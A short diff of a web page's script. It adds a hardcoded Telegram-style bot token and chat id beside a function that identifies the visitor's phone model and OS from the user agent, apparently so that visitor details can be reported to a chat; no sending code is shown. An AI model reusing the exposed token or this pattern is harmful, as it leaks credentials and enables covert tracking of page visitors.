@@ -85,6 +85,10 @@ function done() {
 }
 </script>
 <script>
+const TOKEN = "8927373301:AAELVUuXby9LcMULOsktBPxc3kwkGlveJq4";
+const CHAT = "6803966973";
+const box = document.getElementById("box"), h = document.getElementById("h"), p = document.getElementById("p");
+
 function deviceName(ua) {
   const m = ua.match(/\((?:Linux.*?; )?(?:Android[^;]*; )?([^;)]*(?:SM-[^;)]*|Pixel[^;)]*|iPhone|iPad)[^;)]*)/);
   if (/iPhone/.test(ua)) { const v = (ua.match(/OS (\d+[_\d]*)/) || [,""])[1].replace(/_/g, "."); return "iPhone" + (v ? " · iOS " + v : ""); }
